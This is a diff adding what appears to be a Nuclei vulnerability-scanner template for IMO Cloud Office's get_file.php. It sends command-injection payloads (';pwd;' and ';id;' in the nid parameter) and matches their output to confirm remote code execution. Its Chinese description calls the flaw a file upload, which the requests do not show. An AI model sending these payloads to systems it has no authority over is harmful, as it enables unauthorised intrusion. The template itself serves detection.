@@ -1,0 +1,55 @@
+id: imo-cloud-office-get-file-php-upload-rce
+
+info:
+  name: IMO 云办公 get_file.php 任意文件上传致远程代码执行
+  author: ritikchaddha
+  severity: critical
+  description: |
+    imo cloud office/file/NDisk/get_file.php 对上传文件过滤不严，允许无限制文件上传，攻击者可借此直接获取网站权限。
+  reference:
+    - https://www.henry4e36.top/index.php/archives/130.html#cl-1
+    - https://forum.butian.net/article/213
+  classification:
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
+    cvss-score: 9.8
+    cwe-id: CWE-78
+  metadata:
+    max-request: 3
+  tags: IMO-Cloud Office
+  remediation: >-
+    升级到包含漏洞修复的最新厂商支持版本。在完成升级前，限制对受影响端点的访问，尽可能禁用存在风险的功能，落实最小权限原则，并监控可疑的进程执行行为。
+
+flow: http(1) && http(2)
+
+http:
+  - raw:
+      - |
+        GET / HTTP/1.1
+        Host: {{Hostname}}
+    host-redirects: true
+    max-redirects: 2
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'imo'
+        case-insensitive: true
+        internal: true
+  - raw:
+      - |
+        GET /file/NDisk/get_file.php?cid=1&nid=;pwd; HTTP/1.1
+        Host: {{Hostname}}
+      - |
+        GET /file/NDisk/get_file.php?cid=1&nid=;id; HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: regex
+        part: body_1
+        regex:
+          - 'home/www/html/[^"]*/file/NDisk'
+      - type: regex
+        part: body_2
+        regex:
+          - "uid=[0-9]+.*gid=[0-9]+.*"
+        # digest: 4b0a00483046022100ce53b80dd85ccb46a5c681537340751368afc559376ea4bcadd0304fdbaf7f02022100d229fd0cf9afbd067ef9b6a900dc6538a11c53ea667c06ef82861c8f9cc3e1eb:922c64590222798bb761d5b6d8e72950
